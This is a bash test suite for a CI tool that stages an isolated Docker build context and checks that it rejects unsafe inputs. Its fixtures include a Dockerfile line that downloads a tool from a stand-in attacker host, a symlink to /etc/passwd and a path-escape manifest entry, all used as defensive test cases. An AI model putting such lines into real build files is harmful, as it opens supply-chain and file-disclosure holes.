#!/usr/bin/env bash
set -euo pipefail

DIR=$(cd -- "$(dirname -- "${BASH_SOURCE[0]}")" && pwd)
STAGE="$DIR/../../../docker/build-app-cli/stage-build-context.sh"
WORK=$(mktemp -d)
trap 'rm -rf "$WORK"' EXIT

pass=0
fail=0
ok() {
  printf '  \033[32mok\033[0m   %s\n' "$1"
  pass=$((pass + 1))
}
no() {
  printf '  \033[31mFAIL\033[0m %s\n' "$1" >&2
  fail=$((fail + 1))
}
assert_pass() {
  local description=$1
  shift
  if "$@" >/dev/null 2>&1; then ok "$description"; else no "$description"; fi
}
assert_fail() {
  local description=$1
  shift
  if "$@" >/dev/null 2>&1; then no "$description"; else ok "$description"; fi
}

context_paths() {
  cat <<'EOF'
.dockerignore
.github/actions/deploy-fastly/versions.json
.github/docker/build-app-cli/Dockerfile
.github/docker/build-app-cli/fixtures/gnu-smoke.rs
.github/docker/build-app-cli/fixtures/provenance/valid/archive.tar
.github/docker/build-app-cli/fixtures/wasm-smoke.rs
.github/docker/build-app-cli/image-context-paths.txt
.github/docker/build-app-cli/provenance.schema.json
.github/docker/build-app-cli/verify-toolchain.sh
.github/tools/edgezero-provenance-validator/Cargo.lock
.github/tools/edgezero-provenance-validator/Cargo.toml
.github/tools/edgezero-provenance-validator/src/lib.rs
.tool-versions
EOF
}

make_repo() {
  local root=$1
  mkdir -p \
    "$root/.github/actions/deploy-fastly" \
    "$root/.github/docker/build-app-cli/fixtures/provenance/valid" \
    "$root/.github/docker/build-app-cli/fixtures" \
    "$root/.github/tools/edgezero-provenance-validator/src"
  printf '**\n!.github/**\n!.tool-versions\n' >"$root/.dockerignore"
  printf 'rust 1.95.0\nfastly 15.1.0\n' >"$root/.tool-versions"
  printf '{"fastly":{"version":"15.1.0"}}\n' >"$root/.github/actions/deploy-fastly/versions.json"
  printf 'FROM scratch\nCOPY .tool-versions /image/.tool-versions\n' >"$root/.github/docker/build-app-cli/Dockerfile"
  printf 'fn main() {}\n' >"$root/.github/docker/build-app-cli/fixtures/gnu-smoke.rs"
  printf 'fixture' >"$root/.github/docker/build-app-cli/fixtures/provenance/valid/archive.tar"
  printf 'pub fn smoke() {}\n' >"$root/.github/docker/build-app-cli/fixtures/wasm-smoke.rs"
  printf '{}\n' >"$root/.github/docker/build-app-cli/provenance.schema.json"
  printf '#!/usr/bin/env bash\nexit 0\n' >"$root/.github/docker/build-app-cli/verify-toolchain.sh"
  chmod 0755 "$root/.github/docker/build-app-cli/verify-toolchain.sh"
  printf '[workspace]\n[package]\nname="probe"\nversion="0.0.0"\nedition="2024"\n' \
    >"$root/.github/tools/edgezero-provenance-validator/Cargo.toml"
  printf '# lock\n' >"$root/.github/tools/edgezero-provenance-validator/Cargo.lock"
  printf 'pub fn probe() {}\n' >"$root/.github/tools/edgezero-provenance-validator/src/lib.rs"
  context_paths >"$root/.github/docker/build-app-cli/image-context-paths.txt"
  context_paths >"$root/.github/docker/build-app-cli/gate-paths.txt"

  git -C "$root" init -q
  git -C "$root" config user.email test@example.com
  git -C "$root" config user.name Test
  git -C "$root" add .
  git -C "$root" commit -qm base
}

clone_pair() {
  local name=$1
  GATE="$WORK/$name-gate"
  SOURCE="$WORK/$name-source"
  OUTPUT="$WORK/$name-output"
  make_repo "$GATE"
  git clone -q --no-hardlinks "$GATE" "$SOURCE"
  printf 'ordinary source change\n' >"$SOURCE/app.txt"
  git -C "$SOURCE" add app.txt
  git -C "$SOURCE" commit -qm source
  GATE_SHA=$(git -C "$GATE" rev-parse HEAD)
  SOURCE_SHA=$(git -C "$SOURCE" rev-parse HEAD)
}

run_stage() {
  bash "$STAGE" \
    --gate-root "$GATE" \
    --source-root "$SOURCE" \
    --gate-sha "$GATE_SHA" \
    --source-sha "$SOURCE_SHA" \
    --output "$OUTPUT"
}

commit_gate_change() {
  git -C "$GATE" add -A
  git -C "$GATE" commit -qm fixture
  GATE_SHA=$(git -C "$GATE" rev-parse HEAD)
  git -C "$SOURCE" fetch -q "$GATE" "$GATE_SHA"
  git -C "$SOURCE" rebase -q "$GATE_SHA"
  SOURCE_SHA=$(git -C "$SOURCE" rev-parse HEAD)
}

commit_source_change() {
  git -C "$SOURCE" add -A
  git -C "$SOURCE" commit -qm fixture
  SOURCE_SHA=$(git -C "$SOURCE" rev-parse HEAD)
}

echo "== isolated build-container context staging =="

clone_pair valid
assert_pass "a clean exact G stages its closed context" run_stage
if [[ -f "$OUTPUT/.tool-versions" && ! -e "$OUTPUT/app.txt" && ! -e "$OUTPUT/.git" ]]; then
  ok "the output contains manifested files only"
else
  no "the output contains manifested files only"
fi
if [[ -x "$OUTPUT/.github/docker/build-app-cli/verify-toolchain.sh" ]]; then
  ok "executable mode is preserved"
else
  no "executable mode is preserved"
fi

clone_pair output-exists
mkdir "$OUTPUT"
assert_fail "an existing output path is rejected" run_stage

clone_pair inside-gate
OUTPUT="$GATE/context"
assert_fail "output beneath G is rejected" run_stage

clone_pair inside-source
OUTPUT="$SOURCE/context"
assert_fail "output beneath S is rejected" run_stage

clone_pair wrong-gate-sha
GATE_SHA=$(printf 'f%.0s' {1..40})
assert_fail "a non-HEAD gate SHA is rejected" run_stage

clone_pair wrong-source-sha
SOURCE_SHA=$(printf 'e%.0s' {1..40})
assert_fail "a non-HEAD source SHA is rejected" run_stage

clone_pair dirty-gate
printf dirty >>"$GATE/.tool-versions"
assert_fail "a dirty G checkout is rejected" run_stage

clone_pair dirty-source
printf dirty >>"$SOURCE/.tool-versions"
assert_fail "a dirty S checkout is rejected" run_stage

clone_pair missing-manifest
sed '/Cargo.lock/d' "$GATE/.github/docker/build-app-cli/image-context-paths.txt" \
  >"$GATE/.github/docker/build-app-cli/image-context-paths.txt.new"
mv "$GATE/.github/docker/build-app-cli/image-context-paths.txt.new" \
  "$GATE/.github/docker/build-app-cli/image-context-paths.txt"
commit_gate_change
assert_fail "a missing manifest entry is rejected" run_stage

clone_pair extra-manifest
printf 'unrelated.txt\n' >>"$GATE/.github/docker/build-app-cli/image-context-paths.txt"
printf unrelated >"$GATE/unrelated.txt"
commit_gate_change
assert_fail "an extra manifest entry is rejected" run_stage

clone_pair duplicate-manifest
printf '.tool-versions\n' >>"$GATE/.github/docker/build-app-cli/image-context-paths.txt"
commit_gate_change
assert_fail "a duplicate manifest entry is rejected" run_stage

clone_pair unsorted-manifest
sort -r "$GATE/.github/docker/build-app-cli/image-context-paths.txt" \
  >"$GATE/.github/docker/build-app-cli/image-context-paths.txt.new"
mv "$GATE/.github/docker/build-app-cli/image-context-paths.txt.new" \
  "$GATE/.github/docker/build-app-cli/image-context-paths.txt"
commit_gate_change
assert_fail "an unsorted manifest is rejected" run_stage

clone_pair path-escape
printf '../escape\n' >>"$GATE/.github/docker/build-app-cli/image-context-paths.txt"
commit_gate_change
assert_fail "a path-escape manifest entry is rejected" run_stage

clone_pair symlink-input
rm "$GATE/.tool-versions"
ln -s /etc/passwd "$GATE/.tool-versions"
commit_gate_change
assert_fail "a symlink input is rejected" run_stage

clone_pair hardlink-input
ln "$GATE/.tool-versions" "$GATE/tool-versions-hardlink"
commit_gate_change
assert_fail "a multiply linked input is rejected" run_stage

clone_pair fifo-input
rm "$GATE/.tool-versions"
mkfifo "$GATE/.tool-versions"
assert_fail "a FIFO input is rejected" run_stage

clone_pair device-input
rm "$GATE/.tool-versions"
if mknod "$GATE/.tool-versions" c 1 3 >/dev/null 2>&1; then
  assert_fail "a device input is rejected" run_stage
else
  ok "a device input is rejected (host forbids unprivileged device creation)"
fi

mutation_index=0
for mutation in \
  'ADD https://attacker.invalid/tool /usr/local/bin/tool' \
  'RUN --mount=type=bind,source=.,target=/src true' \
  'COPY . /src' \
  'COPY .tool-versions /usr/local/bin/edgezero-provenance-validator'; do
  mutation_index=$((mutation_index + 1))
  clone_pair "dockerfile-mutation-$mutation_index"
  printf '%s\n' "$mutation" >>"$SOURCE/.github/docker/build-app-cli/Dockerfile"
  commit_source_change
  assert_fail "candidate Dockerfile mutation is rejected: $mutation" run_stage
done

clone_pair changed-source-byte
printf changed >>"$SOURCE/.tool-versions"
commit_source_change
assert_fail "a changed manifested S byte is rejected" run_stage

clone_pair changed-source-mode
chmod 0755 "$SOURCE/.tool-versions"
commit_source_change
assert_fail "a changed manifested S mode is rejected" run_stage

clone_pair unmanifested-source
printf 'COPY unlisted /image/unlisted\n' >>"$SOURCE/.github/docker/build-app-cli/Dockerfile"
printf unlisted >"$SOURCE/unlisted"
commit_source_change
assert_fail "an unmanifested candidate source is rejected" run_stage

printf 'Passed: %d  Failed: %d\n' "$pass" "$fail"
[[ "$fail" -eq 0 ]]
